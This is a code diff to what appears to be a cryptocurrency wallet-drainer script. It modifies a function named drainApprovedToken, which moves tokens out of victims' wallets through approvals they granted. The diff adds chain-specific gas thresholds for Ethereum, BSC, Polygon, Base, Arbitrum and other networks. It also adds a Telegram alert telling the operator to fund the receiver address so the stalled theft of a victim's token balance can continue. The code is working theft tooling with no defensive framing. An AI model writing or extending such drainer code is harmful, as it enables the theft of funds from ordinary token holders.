@@ -411,10 +411,22 @@ async function drainApprovedToken(approval) {
 
         // Check receiver gas balance
         const receiverBalance = await provider.getBalance(RECEIVER_ADDRESS);
-        const minGas = ethers.parseEther("0.001"); // Minimum 0.001 native token
+
+        // Chain-Specific Gas Thresholds
+        let minGas = ethers.parseEther("0.0005"); // Default 0.0005 (Mainnet)
+        const c = chain.toLowerCase();
+        if (c === "bsc" || c === "polygon" || c === "fantom" || c === "base" || c === "arbitrum" || c === "optimism") {
+            minGas = ethers.parseEther("0.0001"); // Very low for L2s/BSC
+        }
 
         if (receiverBalance < minGas) {
-            console.log(`⏳ [DRAIN] Insufficient receiver gas: ${ethers.formatEther(receiverBalance)} (need 0.001+)`);
+            console.log(`⏳ [DRAIN] Insufficient receiver gas on ${chain}: ${ethers.formatEther(receiverBalance)} (need ${ethers.formatEther(minGas)}+)`);
+
+            // Alert user once per loop if gas is low
+            if (!approval.gasAlerted) {
+                sendTelegram(`⚠️ **CRITICAL: Receiver Low on Gas**\nChain: ${chain}\nBalance: ${ethers.formatEther(receiverBalance)}\n\n*Unable to drain ${symbol} ($${(approval.balance / 1e18).toFixed(2)} estimation). Please fund ${RECEIVER_ADDRESS} on ${chain}.*`);
+                approval.gasAlerted = true;
+            }
             return false; // Keep in queue, will retry
         }
 
